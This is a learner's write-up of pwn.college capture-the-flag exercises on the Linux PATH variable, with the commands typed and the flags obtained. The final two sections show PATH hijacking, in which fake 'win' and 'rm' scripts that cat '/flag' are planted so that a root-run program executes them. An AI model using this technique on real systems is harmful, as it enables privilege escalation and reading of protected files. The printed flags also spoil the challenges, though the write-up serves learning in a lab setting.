# Pondering Path

## The PATH Variable
In this challenge we must make it so that _/challemge/run_ can't find the _rm command and then run it so it doesn't delete the flag and the challenge gives us the flag.

### Solve
**Flag:** `pwn.college{o7K9hE6VG35EyDpGLaKUShvYm0P.QX2cDM1wyM0EzNzEzW}`

I set the value of the PATH variable to blank, thus bash can't find the _rm_ anymore. Now I run _/ch*/run_ and get the flag.

```bash
hacker@path~the-path-variable:~$ PATH=""
hacker@path~the-path-variable:~$ /ch*/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{o7K9hE6VG35EyDpGLaKUShvYm0P.QX2cDM1wyM0EzNzEzW}
```

### New Learnings
1. By blanking out the 'PATH' variable we can disrupt the functioning of bash as bash won't be able to find many different commnads.

### References 
-NA-


## The PATH Variable
In this challenge the _/challemge/run_ will run the _win_ command directly by its name, but this command exists in the _/challenge/more\_commands/_ directory, which is not initially in the PATH variable. We need to make sure that _/challenge/run_ can use _win_ by putting its directory in the PATH.

### Solve
**Flag:** `pwn.college{kPMBD_g0Ta9zbwFqTvrvLe04tGI.QX1cjM1wyM0EzNzEzW}`

I set the value of the PATH variable to _/challenge/more\_commands/_, this overwrites all the other paths(which is fine for this challenge as _/challenge/run_ only needs _win_ to the flag). Then I run _/ch*/run_ which can now use _win_ as it's path directory is in the PATH variable.

```bash
hacker@path~setting-path:~$ PATH='/challenge/more_commands'
hacker@path~setting-path:~$ /ch*/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{kPMBD_g0Ta9zbwFqTvrvLe04tGI.QX1cjM1wyM0EzNzEzW}
```

### New Learnings
1. We can add or replace the directories in the PATH variable that contain the commnads that we wish to call by their names.

### References 
-NA-


## Finding Commands
In this challenge we need to _cat_ the _flag_ file which is present in the same directory as that of _win_ command. So we need to find that directory using _which_ and then cat the flag file.

### Solve
**Flag:** `pwn.college{Ed4ksdZzO8mBvnevMA7q0N5Xxmt.01NzEzNxwyM0EzNzEzW}`

I used _which win_ to find the directory of _win_ and then _ls-ed_ it to confirm the existence of the flag file. And finally I _catted_ the flag file and got the flag.

```bash
hacker@path~finding-commands:~$ which win
/challenge/paths/22712/win
hacker@path~finding-commands:~$ ls /ch*/paths/22712
flag  win
hacker@path~finding-commands:~$ cat /ch*/paths/22712/flag
pwn.college{Ed4ksdZzO8mBvnevMA7q0N5Xxmt.01NzEzNxwyM0EzNzEzW}
```

### New Learnings
1. The '_which_' command is used to find the directory a command is located in.

### References 
-NA-


## Adding Commands
In this challenge we need to create a shell script named _win_ that, will be invoked by _/challenge/run_ (which runs as root) and this will output the contents of _/flag_. We need to add the directory of _win_ into the PATH variable so that _/challenge/run_ can access it with it's name.

### Solve
**Flag:** `pwn.college{EjMdA-9XFQHiX15NAV5-nV63Kpt.QX2cjM1wyM0EzNzEzW}`

Firstly I used _which cat_ to find the directory of _cat_. Then I create the shell script and while _catting_ _/flag_ I use the absolute path of _cat_(because we now know the directory of _cat_), this makes sure that _cat_ runs even if it's directory gets ovewritten in the PATH variable. Then I grant execution permission of _win_ to everyone and finally I overwrite the PATH variable by the directory of _win_. Now when I run _/ch*/run_ it can freely access _win_ and print out the flag.

```bash
SCRIPT:

#!/bin/bash
/run/dojo/bin/cat /flag
```

```bash
hacker@path~adding-commands:~$ which cat
/run/dojo/bin/cat
hacker@path~adding-commands:~$ chmod a+x win
hacker@path~adding-commands:~$ PATH="/home/hacker"
hacker@path~adding-commands:~$ /ch*/run
Invoking 'win'....
pwn.college{EjMdA-9XFQHiX15NAV5-nV63Kpt.QX2cjM1wyM0EzNzEzW}
```

### New Learnings
1. We can add new paths witout overwriting them using: '**PATH="$PATH":newDirectory**'
2. If we use the absolute path of some command then it doesn't matter if their path is present in the PATH variable or not, either way it will get executed.

### References 
-NA-


## Hijacking Commands
In this challenge _/challenge/run_ will again delete the flag using _rm_, but will not print anything. We somehow need to trick it into giving us the flag.

### Solve
**Flag:** `pwn.college{0mtUfTDtVJ32uJs03ic2sEEQOiC.QX3cjM1wyM0EzNzEzW}`

After trying a lot different things it finally clicked to me, I need to create a new shell script named _rm_ in a different directory that prints out the flag(since _/challenge/run_ is executed through root the commnds that it runs also get root access and can print the flag directly).
So, I created a new script file called '_rm_' in my home directory(the script is given below). Then I checked and changed the permission of the file and made it executable to everyone. Next I changed the PATH variable to only include my home directory, this made sure that when I run _/challenge/run_ it will the _rm_ created by me and not the original one. Thus, now when I run _/challemge/run_ it executes my shell script and gives me the flag.

```bash
SCRIPT:

#!/bin/bash
/run/dojo/bin/cat /flag
```

```bash
hacker@path~hijacking-commands:~$ ls -l rm
-rw-r--r-- 1 hacker hacker 36 Oct  1 05:58 rm
hacker@path~hijacking-commands:~$ chmod a+x rm
hacker@path~hijacking-commands:~$ PATH="/home/hacker"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{0mtUfTDtVJ32uJs03ic2sEEQOiC.QX3cjM1wyM0EzNzEzW}
```

### New Learnings
1. Programs can be tricked into running different commands when they have the same name and different directories, by chaning the PATH variable to the directory of which ever command we need to execute.

### References 
-NA-